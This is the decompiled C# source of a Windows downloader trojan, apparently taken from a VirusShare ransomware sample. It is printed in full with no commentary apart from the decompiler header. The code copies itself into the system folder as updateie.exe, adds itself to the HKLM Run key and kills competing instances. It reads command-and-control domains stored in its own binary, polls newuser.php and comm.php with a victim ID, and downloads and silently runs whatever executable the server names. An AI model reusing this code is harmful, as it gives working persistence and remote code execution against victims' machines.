// Decompiled with JetBrains decompiler
// Type: Download.Program
// Assembly: Download, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7112DF5F-ED6F-4F31-9A3D-87D028CCE86F
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00025-msil\Trojan-Ransom.Win32.PornoAsset.cwpd-ebc69d973742550d576e0511805e283d8a6ccf5009264cda58763a4e7cdd46e6.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Download
{
  internal static class Program
  {
    public static Saving sv;
    private static Mutex m_mutex;
    public static string drr = (string) null;
    public static RegistryKey softwareKey = Registry.LocalMachine.OpenSubKey("Software", true);
    public static RegistryKey hkMine = Program.softwareKey.CreateSubKey("DownLoad");

    [STAThread]
    private static void Main()
    {
      DateTime now = DateTime.Now;
      string str1 = "" + (object) now.Day + (object) now.Month + (object) now.Year + (object) now.Hour + (object) now.Minute + (object) now.Second;
      if (Program.hkMine.GetValue("ID") == null)
        Program.hkMine.SetValue("ID", (object) str1);
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      string systemDirectory = Environment.SystemDirectory;
      string startupPath = Application.StartupPath;
      Exception exception;
      try
      {
        Process process1;
        if (systemDirectory.ToLower() != startupPath.ToLower())
        {
          string executablePath = Application.ExecutablePath;
          Process currentProcess;
          string str2;
          try
          {
            FileInfo fileInfo1 = new FileInfo(Application.ExecutablePath);
            if (fileInfo1.Exists)
            {
              if (fileInfo1.Length < 16900L)
              {
                Application.Run((Form) new Frm1());
              }
              else
              {
                string str3 = Environment.SystemDirectory + "\\updateie.exe";
                FileInfo fileInfo2 = new FileInfo(str3);
                Program.drr = str3;
                if (fileInfo2.Exists)
                {
                  currentProcess = Process.GetCurrentProcess();
                  foreach (Process process2 in Process.GetProcesses("."))
                  {
                    str2 = (string) null;
                    string str4 = "updateie.exe";
                    string str5 = str4.Substring(0, str4.LastIndexOf("."));
                    if (process2.ProcessName == str5 && Assembly.GetExecutingAssembly().Location.Replace("/", "\\") != process2.MainModule.FileName)
                      process2.Kill();
                  }
                }
                fileInfo2.Delete();
                System.IO.File.Copy(executablePath, str3);
                Program.hkMine.SetValue("tmp_dir", (object) Application.ExecutablePath);
                Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).SetValue("DowloadEr", (object) str3);
                process1 = Process.Start(new ProcessStartInfo()
                {
                  FileName = "cmd.exe",
                  Arguments = "/c " + str3,
                  UseShellExecute = false,
                  CreateNoWindow = true
                });
                Application.Exit();
              }
            }
          }
          catch (Exception ex1)
          {
            exception = ex1;
            try
            {
              Thread.Sleep(1000);
              string str6 = Environment.SystemDirectory + "\\updateie.exe";
              FileInfo fileInfo = new FileInfo(str6);
              Program.drr = str6;
              if (fileInfo.Exists)
              {
                currentProcess = Process.GetCurrentProcess();
                foreach (Process process3 in Process.GetProcesses("."))
                {
                  str2 = (string) null;
                  string str7 = "updateie.exe";
                  string str8 = str7.Substring(0, str7.LastIndexOf("."));
                  if (process3.ProcessName == str8 && Assembly.GetExecutingAssembly().Location.Replace("/", "\\") != process3.MainModule.FileName)
                    process3.Kill();
                }
              }
              fileInfo.Delete();
              System.IO.File.Copy(executablePath, str6);
              Program.hkMine.SetValue("tmp_dir", (object) Application.ExecutablePath);
              Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\", true).SetValue("DownloadEr", (object) str6);
              process1 = Process.Start(new ProcessStartInfo()
              {
                FileName = "cmd.exe",
                Arguments = "/c " + str6,
                UseShellExecute = false,
                CreateNoWindow = true
              });
              Application.Exit();
            }
            catch (Exception ex2)
            {
            }
          }
        }
        else
        {
          if (Program.InstanceExists())
            return;
          string domain1 = (string) null;
          string domain2 = (string) null;
          int num1 = 10;
          string str9 = (string) null;
          if (Program.hkMine.GetValue("tmp_dir") != null)
          {
            FileStream fileStream = new FileStream(Program.hkMine.GetValue("tmp_dir").ToString(), FileMode.Open, FileAccess.Read);
            byte[] numArray = new byte[20000];
            char[] chars = new char[20000];
            if (fileStream.CanSeek)
            {
              fileStream.Seek(0L, SeekOrigin.Begin);
              fileStream.Read(numArray, 0, 20000);
              Encoding.UTF8.GetDecoder().GetChars(numArray, 0, numArray.Length, chars, 0);
              string str10 = Program.Extract(new string(chars), "\adomain1\adomain2\atimeOut\tdest_file", "\v", 1);
              string str11 = Program.Extract(str10, "tr", "tr", 1);
              domain1 = str11;
              Program.hkMine.SetValue("Domain1", (object) str11);
              string str12 = Program.Extract(str10, "tr", "tr", 3);
              domain2 = str12;
              Program.hkMine.SetValue("Domain2", (object) str12);
              string s = Program.Extract(str10, "tr", "tr", 5);
              num1 = int.Parse(s);
              Program.hkMine.SetValue("TimeOut", (object) s);
              str9 = Program.Extract(str10, "tr", "tr", 7);
            }
            fileStream.Close();
            FileInfo fileInfo = new FileInfo(Program.hkMine.GetValue("tmp_dir").ToString());
            if (fileInfo.Exists)
              fileInfo.Delete();
            Program.hkMine.DeleteValue("tmp_dir", true);
          }
          else
          {
            domain1 = Program.hkMine.GetValue("Domain1").ToString();
            domain2 = Program.hkMine.GetValue("Domain2").ToString();
            num1 = int.Parse(Program.hkMine.GetValue("TimeOut").ToString());
          }
          int num2 = 0;
          string str13;
          while (true)
          {
            try
            {
              str13 = Program.Request_Post(domain1, Program.hkMine.GetValue("ID").ToString());
              ++num2;
              string str14 = Program.Request(domain1, Program.hkMine.GetValue("ID").ToString());
              if (str14 != "")
              {
                Uri remoteURL = new Uri(Program.Extract(Program.Extract(str14, "RUN", "RUN>", 1), ">", "</", 1));
                string localFile = Environment.SystemDirectory + "\\updatefile.exe";
                Program.Download(remoteURL, localFile);
                process1 = Process.Start(new ProcessStartInfo()
                {
                  FileName = "cmd.exe",
                  Arguments = "/c " + localFile,
                  UseShellExecute = false,
                  CreateNoWindow = true
                });
                Thread.Sleep(num1 * 60000);
              }
              else if (num2 == 1)
              {
                Thread.Sleep(10000);
              }
              else
              {
                Thread.Sleep(num1 * 60000);
                num2 = 0;
              }
            }
            catch (Exception ex3)
            {
              exception = ex3;
              try
              {
                str13 = Program.Request_Post(domain2, Program.hkMine.GetValue("ID").ToString());
                ++num2;
                string str15 = Program.Request(domain2, Program.hkMine.GetValue("ID").ToString());
                if (str15 != "")
                {
                  Uri remoteURL = new Uri(Program.Extract(Program.Extract(str15, "RUN", "RUN>", 1), ">", "</", 1));
                  string localFile = Environment.SystemDirectory + "\\updatefile.exe";
                  Program.Download(remoteURL, localFile);
                  process1 = Process.Start(new ProcessStartInfo()
                  {
                    FileName = "cmd.exe",
                    Arguments = "/c " + localFile,
                    UseShellExecute = false,
                    CreateNoWindow = true
                  });
                  Thread.Sleep(num1 * 60000);
                }
                else if (num2 == 1)
                {
                  Thread.Sleep(10000);
                }
                else
                {
                  Thread.Sleep(num1 * 60000);
                  num2 = 0;
                }
              }
              catch (Exception ex4)
              {
                ++num2;
                if (num2 == 1)
                {
                  Thread.Sleep(10000);
                }
                else
                {
                  Thread.Sleep(num1 * 60000);
                  num2 = 0;
                }
              }
            }
          }
        }
      }
      catch (Exception ex)
      {
        exception = ex;
      }
    }

    public static string Request_Post(string domain, string id)
    {
      if (domain.IndexOf("ttp://") < 1)
        domain = "http://" + domain;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(domain + "/newuser.php");
      httpWebRequest.AllowAutoRedirect = true;
      httpWebRequest.Method = "POST";
      httpWebRequest.ContentType = "application/x-www-form-urlencoded";
      byte[] bytes = Encoding.ASCII.GetBytes("userid=" + id);
      httpWebRequest.ContentLength = (long) bytes.Length;
      Stream requestStream = httpWebRequest.GetRequestStream();
      requestStream.Write(bytes, 0, bytes.Length);
      requestStream.Close();
      return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
    }

    public static void DownloadBinaryFile(HttpWebResponse response, string filename)
    {
      byte[] buffer = new byte[4096];
      FileStream fileStream = new FileStream(filename, FileMode.Create);
      Stream responseStream = response.GetResponseStream();
      int count;
      do
      {
        count = responseStream.Read(buffer, 0, buffer.Length);
        if (count > 0)
          fileStream.Write(buffer, 0, count);
      }
      while (count > 0);
      response.Close();
      responseStream.Close();
      fileStream.Close();
    }

    public static void Download(Uri remoteURL, string localFile) => Program.DownloadBinaryFile((HttpWebResponse) WebRequest.Create(remoteURL).GetResponse(), localFile);

    public static string Request(string domain, string id)
    {
      if (domain.IndexOf("ttp://") < 1)
        domain = "http://" + domain;
      HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(domain + "/comm.php?userid=" + id);
      httpWebRequest.AllowAutoRedirect = true;
      return new StreamReader(httpWebRequest.GetResponse().GetResponseStream()).ReadToEnd();
    }

    public static string Extract(string str, string token1, string token2, int count)
    {
      int num1;
      int num2 = num1 = 0;
      do
      {
        num2 = str.IndexOf(token1, num2 + 1);
        if (num2 == -1)
          return (string) null;
        --count;
      }
      while (count > 0);
      int num3 = str.IndexOf(token2, num2 + 1);
      if (num3 == -1)
        return (string) null;
      int startIndex = num2 + token1.Length;
      return str.Substring(startIndex, num3 - startIndex);
    }

    private static bool InstanceExists()
    {
      bool createdNew;
      Program.m_mutex = new Mutex(false, "dwn", out createdNew);
      return !createdNew;
    }
  }
}
